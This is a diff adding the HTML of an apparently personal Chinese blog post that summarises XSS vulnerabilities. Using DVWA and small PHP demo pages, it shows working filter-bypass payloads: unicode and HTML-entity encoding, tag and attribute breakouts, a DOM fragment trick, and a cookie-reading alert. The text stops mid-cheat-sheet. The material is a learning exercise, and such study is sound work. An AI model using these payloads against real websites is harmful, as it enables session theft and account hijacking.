@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言学习xss漏洞，并加以总结。 正文漏洞起因12可以输入的地方没有做好对应的过滤，引发的xss攻击``` 危害1234561.盗取cookie2.劫持用户浏览器3.钓鱼攻击4.挂马5.在一定的条件下可以getshell6.会话劫持 漏洞类型1234反射型XSSDOM型XSS存储型XSS其他型XSS 例如：Flash xss 反射型xss危险级别：低插入的语句停留在当前页面。 DOMX型xss危险">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss summary">
+<meta property="og:url" content="http://422926799.github.io/posts/5104189a.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言学习xss漏洞，并加以总结。 正文漏洞起因12可以输入的地方没有做好对应的过滤，引发的xss攻击``` 危害1234561.盗取cookie2.劫持用户浏览器3.钓鱼攻击4.挂马5.在一定的条件下可以getshell6.会话劫持 漏洞类型1234反射型XSSDOM型XSS存储型XSS其他型XSS 例如：Flash xss 反射型xss危险级别：低插入的语句停留在当前页面。 DOMX型xss危险">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://niuerdata.g.com.cn/data/shareimg_oss/big_media_img/2018/04/13/ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/12/FjAytO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/12/FjEh24.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/12/FjVKZq.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/12/FjVmss.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/12/FjdSVx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/12/FjBGsH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/12/FjBdFP.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/13/FvJ9te.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/13/FvJipd.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/13/FvJF1A.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/13/FvJVnP.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/13/FvJZ0f.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/13/FvJyB6.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/13/FvJj3j.md.png">
+<meta property="og:updated_time" content="2019-04-19T12:36:16.296Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss summary">
+<meta name="twitter:description" content="前言学习xss漏洞，并加以总结。 正文漏洞起因12可以输入的地方没有做好对应的过滤，引发的xss攻击``` 危害1234561.盗取cookie2.劫持用户浏览器3.钓鱼攻击4.挂马5.在一定的条件下可以getshell6.会话劫持 漏洞类型1234反射型XSSDOM型XSS存储型XSS其他型XSS 例如：Flash xss 反射型xss危险级别：低插入的语句停留在当前页面。 DOMX型xss危险">
+<meta name="twitter:image" content="https://niuerdata.g.com.cn/data/shareimg_oss/big_media_img/2018/04/13/ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>xss summary</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/cde0d7e7.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/2f842885.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/5104189a.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/5104189a.html&text=xss summary"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/5104189a.html&is_video=false&description=xss summary"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xss summary&body=Check out this article: http://422926799.github.io/posts/5104189a.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/5104189a.html&title=xss summary"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/5104189a.html&name=xss summary&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        xss summary
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-01-12T00:35:06.000Z" itemprop="datePublished">2019-01-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习xss漏洞，并加以总结。<br><img src="https://niuerdata.g.com.cn/data/shareimg_oss/big_media_img/2018/04/13/ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG" alt="ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG"></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><b>漏洞起因</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以输入的地方没有做好对应的过滤，引发的xss攻击</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
+<p><b>危害</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.盗取cookie</span><br><span class="line">2.劫持用户浏览器</span><br><span class="line">3.钓鱼攻击</span><br><span class="line">4.挂马</span><br><span class="line">5.在一定的条件下可以getshell</span><br><span class="line">6.会话劫持</span><br></pre></td></tr></table></figure></p>
+<p><b>漏洞类型</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反射型XSS</span><br><span class="line">DOM型XSS</span><br><span class="line">存储型XSS</span><br><span class="line">其他型XSS 例如：Flash xss</span><br></pre></td></tr></table></figure></p>
+<p><b>反射型xss</b><br>危险级别：低<br>插入的语句停留在当前页面。</p>
+<p><b>DOMX型xss</b><br>危险级别：中<br>DOM型xss又分为两种<br>1.可见型<br>2.不可见型<br>插入的语句影响js</p>
+<p><b>存储型xss</b><br>危险级别：高<br>插入的语句保存在数据库</p>
+<p>DVWA测试：<br>在low级别下的测试，没有任何防御。可以插入任意标签如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;yuan&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/12/FjAytO.png" alt="FjAytO.png"></p>
+<p>如果过滤了alert()如何绕过：</p>
+<p>PHP代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">echo $q;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Demo1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;输入你的名称&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;POST&quot; action=&quot;demo1.php&quot;&gt;</span><br><span class="line">    输入：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;提交&lt;/form&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当输入alert的时候就会被替换成空，当然我们可以使用其他的什么标签来代替script，但是如果只用script如何绕过呢？使用js转义。将alert转义</p>
+<blockquote>
+<p>当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。</p>
+</blockquote>
+<p>也就是说unicode编码只能编码属性名</p>
+<p>原</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>js转义后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/01/12/FjEh24.png" alt="FjEh24.png"></p>
+<p>注意：使用unicode编码之前要确定对方有没有过滤\</p>
+<p>html转义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中</span><br><span class="line">（&lt;a href=&apos;xxxx&apos;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，</span><br><span class="line">如：&amp;#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，</span><br><span class="line">那在href=&apos;xx&apos;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段，JS字符串中，字符还可以表示为unicode的形式</span><br></pre></td></tr></table></figure>
+<p>源：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;s&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>转义后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&quot;&gt;s&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/01/12/FjVKZq.md.png" alt="FjVKZq.md.png"></p>
+<p><img src="https://s2.ax1x.com/2019/01/12/FjVmss.png" alt="FjVmss.png"></p>
+<p><b>输出在&lt;script&gt;&lt;/script&gt;之间的情况</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">$c=&quot;&lt;script&gt;var w=[$q]$q;&lt;/script&gt;&quot;;</span><br><span class="line">echo $c;</span><br><span class="line">#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">]&lt;/script&gt;&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;&lt;script&gt; //闭合对应前后script标签</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/12/FjdSVx.png" alt="FjdSVx.png"></p>
+<p><b>输出在html属性里面</b><br>假设输出在input标签里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">$c=&quot;&lt;input value=&apos;$q&apos;&gt;&quot;;</span><br><span class="line">echo $c;</span><br><span class="line">#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; onclick=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/01/12/FjBGsH.png" alt="FjBGsH.png"></p>
+<p><b>假设输出在img标签里</b></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_POST[&apos;name&apos;];</span><br><span class="line">$guanjianzi=&quot;alert&quot;;</span><br><span class="line">$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);</span><br><span class="line">$c=&quot;&lt;img src=&apos;$q&apos;&gt;&quot;;</span><br><span class="line">echo $c;</span><br><span class="line">#echo &quot;&lt;img src=&apos;&apos; onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&apos;&gt;&quot;;</span><br><span class="line">#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;1/**/onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/01/12/FjBdFP.md.png" alt="FjBdFP.md.png"></p>
+<p>输出在标签里的绕过总结：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.先想办法闭合周围的什么双引号之类的东西</span><br><span class="line">2.判断有什么过滤掉的，如果没有过滤自然最好</span><br><span class="line">3.查询标签对应可以执行js的属性，然后插入代码即可</span><br></pre></td></tr></table></figure></p>
+<p><b>DOM型的xss</b><br>这里非常蛋疼，chrome拦截了DVWA那边的xss，还要我开虚拟机。。。<br>DOM型xss分为两种：<br>1.可见型DOM xss<br>2.不可见型DOM xss</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">何为DOM？,你插入的代码会暂存在某些标签之中，并且影响输出</span><br></pre></td></tr></table></figure>
+<p>DVWA的DOM xss就是不可见类型<br><img src="https://s2.ax1x.com/2019/01/13/FvJ9te.png" alt="FvJ9te.png"></p>
+<p>源代码不可见<br><img src="https://s2.ax1x.com/2019/01/13/FvJipd.md.png" alt="FvJipd.md.png"></p>
+<p>F12可见<br><img src="https://s2.ax1x.com/2019/01/13/FvJF1A.md.png" alt="FvJF1A.md.png"></p>
+<p>low级无任何防御直接插入payload<br><img src="https://s2.ax1x.com/2019/01/13/FvJVnP.md.png" alt="FvJVnP.md.png"></p>
+<p>medimu级过滤了script</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line">    $default = $_GET[&apos;default&apos;]; </span><br><span class="line">     </span><br><span class="line">    # Do not allow script tags </span><br><span class="line">    if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;  /*判断script是否出现在了参数里面*/</span><br><span class="line">        header (&quot;location: ?default=English&quot;); </span><br><span class="line">        exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用：&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt; //要闭合select标签，因为img在select标签里面是不可见的</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/01/13/FvJZ0f.md.png" alt="FvJZ0f.md.png"></p>
+<p>high级对default进行了判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;  /*判断是否有default这个键名和传的GETdefault参数不为null*/</span><br><span class="line"></span><br><span class="line">    # White list the allowable languages </span><br><span class="line">    switch ($_GET[&apos;default&apos;]) &#123;  /*判断default是否为三个的其中一个，如果不是则重新设置header头，302跳转*/</span><br><span class="line">        case &quot;French&quot;: </span><br><span class="line">        case &quot;English&quot;: </span><br><span class="line">        case &quot;German&quot;: </span><br><span class="line">        case &quot;Spanish&quot;: </span><br><span class="line">            # ok </span><br><span class="line">            break; </span><br><span class="line">        default: </span><br><span class="line">            header (&quot;location: ?default=English&quot;); </span><br><span class="line">            exit; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>使用#杀掉判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/01/13/FvJyB6.md.png" alt="FvJyB6.md.png"></p>
+<p><b>存储型xss</b><br>当我们插入的恶意代码都会保留在数据库，下次在访问的时候就会自动执行js。</p>
+<p>每次进入到页面都会执行js</p>
+<p><img src="https://s2.ax1x.com/2019/01/13/FvJj3j.md.png" alt="FvJj3j.md.png"></p>
+<p>这里就不重复了，告辞（滑稽）<br>用beef来配置存储型xss是个不错的选择</p>
+<p>总结：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞起因</span><br><span class="line">    没有做好对应的过滤标签措施，导致攻击者可以注入恶意代码</span><br><span class="line"></span><br><span class="line">对付那种无任何过滤的</span><br><span class="line">    &lt;img src=1 onerror=alert(document.cookie)&gt;</span><br><span class="line">    &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;eval(alert(&apos;xss&apos;))&lt;/script&gt;</span><br><span class="line">    &lt;a 